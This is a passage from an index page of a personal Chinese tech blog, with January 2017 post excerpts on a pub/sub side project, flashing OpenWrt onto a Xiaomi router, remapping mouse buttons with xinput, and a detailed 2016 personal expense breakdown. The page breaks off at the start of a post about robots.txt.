<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/44/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/44/"/>





  <title>逐流小站</title>
  





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MW47YH6RH0');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  
  <div class="algolia-popup popup search-popup">
    <div class="algolia-search">
      <div class="algolia-search-input-icon">
        <i class="fa fa-search"></i>
      </div>
      <div class="algolia-search-input" id="algolia-search-input"></div>
    </div>

    <div class="algolia-results">
      <div id="algolia-stats"></div>
      <div id="algolia-hits"></div>
      <div id="algolia-pagination" class="algolia-pagination"></div>
    </div>

    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
  </div>




    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/23/2017/2017-01-23-introducing-stream/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/23/2017/2017-01-23-introducing-stream/" itemprop="url">Stream: 给机器人用的 Twitter</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-23T00:00:00+08:00">
                2017-01-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p><a target="_blank" rel="noopener" href="https://stream.pub/">Stream</a> 是我在 2016 年中旬完成的一个业余项目，它希望提供一个基于发布、订阅模型的消息服务，提供 HTTP API 并传输结构化的数据（JSON）。适用的场景就是自动化工具间的通讯（例如两个运行在 NAT 内的脚本需要交换数据）、自动化脚本需要推送数据给人阅读（人可以在 Web UI 上阅读消息）。</p>
<p>还更进一步希望能够提供移动平台的客户端，对于已经订阅的消息实现实时的推送，不过这个部分并没有完成。其实也是因为这个项目被搁置了很久，在最近我也发现了一些和 Stream 非常相似的服务（<a target="_blank" rel="noopener" href="https://getstream.io/">getstream.io</a>），所以才将这个半成品发布了出来。</p>
<p>目前 Stream 的 Web UI 可以发布、以时间轴查看消息、按照标签检索消息；HTTP API（文档位于 <a target="_blank" rel="noopener" href="https://stream.pub/api-reference/">Stream API Reference</a>）还提供了注册和登录帐号的功能，登录帐号后发出的消息会包含你的用户名作为特殊的标签。</p>
<p>当然，就像我其他的业余项目一样，Stream 其实更多地是在实践一些新的技术，比如基于 React 的双端渲染、React Native、RAML、Docker Swarm 等等。</p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/20/Xiaomi-Openwrt-&&-Git/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/20/Xiaomi-Openwrt-&&-Git/" itemprop="url">Tech Daily@1-20</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-20T00:00:00+08:00">
                2017-01-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech-Daily/" itemprop="url" rel="index">
                    <span itemprop="name">Tech Daily</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>小米路由器mini（Xiaomi mini R1CM）刷Openwrt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp /path/to/PandoraBox-xxxx.bin root@192.168.1.1:/tmp/PandoraBox.bin</span><br><span class="line">mtd -r write /tmp/PandoraBox.bin firmware</span><br></pre></td></tr></table></figure>



<blockquote>
<p>從爬文中得知，小米路由器Mini 官方韌體是雙系統，由於 ROM 有16MB，官方韌體都小於8MB，所以會有一份備援系統（8MB+8MB），因此如果刷了大於 8MB 的第三方韌體的話，會覆蓋掉第二個分區的系統，導致未來刷回官方韌體時會有掉 SN 的問題，而且再也無法刷入 SSH，從此以後就只能乖乖用官方韌體，再也不能玩刷機，目前新版的 PandoraBox 韌體大約都在 10MB 左右，所以刷機還真要有點決心，除非完整備份小米路由器Mini 中所有分區的資料，才能在日後完整刷回官方韌體，當然，如果已經完全放棄官方韌體的話，這些問題都是不用考慮的。from -  <a target="_blank" rel="noopener" href="http://blog.icece.tw/MiWiFi-Mini-Flash-uboot">http://blog.icece.tw/MiWiFi-Mini-Flash-uboot</a></p>
</blockquote>
<h2 id="Disable-middle-button-of-mouse"><a href="#Disable-middle-button-of-mouse" class="headerlink" title="Disable middle button of mouse"></a>Disable middle button of mouse</h2><p>Execute those commands:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xinput list</span><br><span class="line">⎡ Virtual core pointer                    	<span class="built_in">id</span>=2	[master pointer  (3)]</span><br><span class="line">⎜   ↳ Virtual core XTEST pointer              	<span class="built_in">id</span>=4	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ MI Dongle MI Wireless Mouse             	<span class="built_in">id</span>=11	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ MI Dongle MI Wireless Mouse             	<span class="built_in">id</span>=12	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ DLL0704:01 06CB:76AE Touchpad           	<span class="built_in">id</span>=14	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ PS/2 Synaptics TouchPad                 	<span class="built_in">id</span>=17	[slave  pointer  (2)]</span><br><span class="line">⎜   ↳ MiMouse                                 	<span class="built_in">id</span>=21	[slave  pointer  (2)]</span><br><span class="line"></span><br><span class="line">xinput set-button-map 21 1 0 3</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/20/Xiaomi-Openwrt-&&-Git/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/20/2017/2017-01-21-expenses-analysis-2016/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/20/2017/2017-01-21-expenses-analysis-2016/" itemprop="url">2016 年度支出分析</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-20T00:00:00+08:00">
                2017-01-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p>我一直热衷于做一些奇奇怪怪的数据统计 —— 今年一整年我统计了我的每一笔支出，并在此做一个分析，感谢 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/20338162">Expense</a> 这个小巧的记录工具和 Excel 这个分析工具。</p>
<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>类别 | 金额 | 比例 | 备注<br>——– | — | —<br>数码 | 28700 | 22% | 手机、电脑等<br>房租水电 | 23755 | 19% |<br>餐饮 | 22856 | 18% |<br>网络服务 | 14620 | 11% | 云服务或订阅制软件<br>零食 | 7553 | 6% |<br>礼物 | 4657 | 4% |<br>玩具 | 4575 | 4% | 仅包括非电子产品<br>皮蛋豆腐 | 4384 | 3% |<br>交通 | 4135 | 3% |<br>软件游戏 | 2851 | 2% | 非订阅制软件和游戏<br>生活用品 | 2567 | 2% |<br>医疗 | 2237 | 2% |<br>数字内容 | 2129 | 2% | 电影、电子书等<br>衣物个护 | 1319 | 1% |<br>旅行娱乐 | 1276 | 1% | 住宿费用和线下娱乐活动<br>实体书 | 726 | 0% |</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/expenses-overall.png"></p>
<h2 id="数码"><a href="#数码" class="headerlink" title="数码"></a>数码</h2><p>果然最多还是花在数码产品上，其中 58% 花在了苹果的产品上。</p>
<p>项目 | 金额 | 比例 | 备注<br>——– | — | —<br>iPhone SE * 2 | 8176 | 28% | 第一个 SE 到手一周就被盗了<br>MacBook Pro | 5073 | 18% | 公司报销了很大一部分<br>XPS | 3708 | 13% | 基本没怎么用就转手了<br>iPad | 2888 | 10% |<br>4k 显示器 | 2399 | 8% |</p>
<h2 id="房租水电"><a href="#房租水电" class="headerlink" title="房租水电"></a>房租水电</h2><p>项目 | 金额 | 比例 | 平均每月<br>——– | — | —<br>房租 | 20700 | 87% | 1725<br>电费 | 2966 | 12% | 247<br>水费 | 89 | 0% | 7</p>
<h2 id="餐饮"><a href="#餐饮" class="headerlink" title="餐饮"></a>餐饮</h2><p>仅包括正餐，也包括请人吃饭；今年大部分早饭是在家煮咖啡吃饼干，并没有计入餐饮分类，午饭和晚饭则几乎全部是在外面吃的，没自己做过饭，这让这个统计变得十分简单。</p>
<p>项目 | 金额 | 比例 | 平均每日 | 平均每次<br>——– | — | —<br>晚饭 | 14449 | 63% | 40 | 45<br>午饭 | 8064 | 35% | 22 | 29<br>早饭 | 63 | 0% | 0 | 9</p>
<h2 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h2><p>项目 | 金额 | 比例 | 平均每月<br>——– | — | —<br>QingCloud | 5656 | 39% | 471<br>域名续费 | 2402 | 16% | 200<br>Linode | 2221 | 15% | 185<br>DigitalOcean | 1010 | 7% | 84<br>电话、宽带、流量 | 799 | 5% | 67<br>GitHub | 558 | 4% | 47</p>
<h2 id="零食"><a href="#零食" class="headerlink" title="零食"></a>零食</h2><p>这个类别的统计并不是很详细，很多时候没有记录具体内容。</p>
<p>项目 | 金额 | 比例 | 备注<br>——– | — | —<br>咖啡 | 1346 | 18% | 包括咖啡店消费和咖啡豆等材料<br>饮料 | 903 | 12% | 除咖啡、牛奶、水以外<br>牛奶 | 549 | 7% |</p>
<h2 id="玩具"><a href="#玩具" class="headerlink" title="玩具"></a>玩具</h2><table>
<thead>
<tr>
<th>项目</th>
<th>金额</th>
<th>比例</th>
</tr>
</thead>
<tbody><tr>
<td>乒乓球桌</td>
<td>1099</td>
<td>24%</td>
</tr>
<tr>
<td>Yubikey</td>
<td>660</td>
<td>14%</td>
</tr>
<tr>
<td>咖啡机</td>
<td>399</td>
<td>9%</td>
</tr>
</tbody></table>
<h2 id="皮蛋豆腐"><a href="#皮蛋豆腐" class="headerlink" title="皮蛋豆腐"></a>皮蛋豆腐</h2><p>项目 | 金额 | 比例 | 平均每月<br>——– | — | —<br>绝育手术 | 2000 | 46% |<br>猫粮 | 1094 | 25% | 96</p>
<h2 id="交通"><a href="#交通" class="headerlink" title="交通"></a>交通</h2><table>
<thead>
<tr>
<th>项目</th>
<th>金额</th>
<th>比例</th>
</tr>
</thead>
<tbody><tr>
<td>火车票</td>
<td>1416</td>
<td>34%</td>
</tr>
<tr>
<td>滴滴</td>
<td>1058</td>
<td>26%</td>
</tr>
<tr>
<td>机票</td>
<td>586</td>
<td>14%</td>
</tr>
<tr>
<td>公交卡</td>
<td>327</td>
<td>8%</td>
</tr>
</tbody></table>
<h2 id="软件游戏"><a href="#软件游戏" class="headerlink" title="软件游戏"></a>软件游戏</h2><table>
<thead>
<tr>
<th>项目</th>
<th>金额</th>
<th>比例</th>
</tr>
</thead>
<tbody><tr>
<td>Steam 游戏</td>
<td>1702</td>
<td>60%</td>
</tr>
<tr>
<td>Sketch</td>
<td>723</td>
<td>25%</td>
</tr>
<tr>
<td>守望先锋</td>
<td>198</td>
<td>7%</td>
</tr>
</tbody></table>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017-01-reading-list">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-01-reading-list" itemprop="url">Reading List</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-16T15:20:00+08:00">
                2017-01-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          Reading List with some articles from December 2016 - January 2017
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017-01-reading-list">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/14/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%B7%A5%E5%85%B7%E8%87%AA%E9%80%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/14/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%B7%A5%E5%85%B7%E8%87%AA%E9%80%89/" itemprop="url">前端工程化工具自选</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-14T20:51:00+08:00">
                2017-01-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>工欲善其事，必先利其器。在Web2.0+的时代，前端的工作早已经不再是切切图、写写动效了。现在，前端的发展已经走向工程化、自动化、大型化，而这些进步需要一大批前端工具来实现。下面是我目前选择的一些前端工程化工具，以备使用时参考。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/14/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%B7%A5%E5%85%B7%E8%87%AA%E9%80%89/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/12/2017/year-summary-2016/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/12/2017/year-summary-2016/" itemprop="url">我的 2016 年终总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-12T22:53:04+08:00">
                2017-01-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>人生天地之间，若白驹之过隙，忽然而已。——《庄子·知北游》</p>
</blockquote>
<p>又到了写年终总结的时候了，时间过得真鸡儿快啊。虽然没有 <a target="_blank" rel="noopener" href="http://life-is-strange.wikia.com/wiki/Maxine_Caulfield">Maxine Caulfield</a> 那样操控时间轴的能力，但是回顾一下我在 2016 的大事件的能力还是有的。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/01/12/2017/year-summary-2016/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/01/12/2017/01/robots/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/01/12/2017/01/robots/" itemprop="url">Robots协议的那些事</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-12T12:33:20+08:00">
                2017-01-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%8D%8F%E8%AE%AE/" itemprop="url" rel="index">
                    <span itemprop="name">协议</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
